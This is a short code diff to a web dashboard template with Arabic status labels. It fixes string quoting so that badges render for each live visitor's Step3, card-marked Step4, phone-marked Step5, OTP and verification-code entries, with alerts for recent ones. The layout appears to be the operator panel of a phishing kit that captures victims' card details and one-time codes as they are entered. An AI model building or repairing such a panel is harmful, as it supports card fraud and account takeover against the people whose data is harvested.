@@ -323,11 +323,11 @@
                                 <div class="flex items-center gap-2 flex-wrap">
                                     <span class="online-dot ${v.isOnline ? 'online' : 'offline'}"></span>
                                     <span class="text-xs text-gray-600">${v.isOnline ? 'متصل' : 'غير متصل'}</span>
-                                    ${v.data?.step3 ? '<span class="relative px-2 py-0.5 bg-green-100 text-green-700 rounded text-xs">Step3${isRecent(v.data.step3.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
-                                    ${v.data?.step4 ? '<span class="relative px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">💳 Step4${isRecent(v.data.step4.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
-                                    ${v.data?.step5 ? '<span class="relative px-2 py-0.5 bg-orange-100 text-orange-700 rounded text-xs">📱 Step5${isRecent(v.data.step5.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
-                                    ${v.otp?.current?.otp ? '<span class="relative px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">🔑 OTP${isRecent(v.otp.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
-                                    ${v.verification?.current?.verificationCode ? '<span class="relative px-2 py-0.5 bg-pink-100 text-pink-700 rounded text-xs">✔️ Verify${isRecent(v.verification.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
+                                    ${v.data?.step3 ? `<span class="relative px-2 py-0.5 bg-green-100 text-green-700 rounded text-xs">Step3${isRecent(v.data.step3.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
+                                    ${v.data?.step4 ? `<span class="relative px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">💳 Step4${isRecent(v.data.step4.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
+                                    ${v.data?.step5 ? `<span class="relative px-2 py-0.5 bg-orange-100 text-orange-700 rounded text-xs">📱 Step5${isRecent(v.data.step5.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
+                                    ${v.otp?.current?.otp ? `<span class="relative px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">🔑 OTP${isRecent(v.otp.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
+                                    ${v.verification?.current?.verificationCode ? `<span class="relative px-2 py-0.5 bg-pink-100 text-pink-700 rounded text-xs">✔️ Verify${isRecent(v.verification.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
                                 </div>
                             </div>
                         </div>
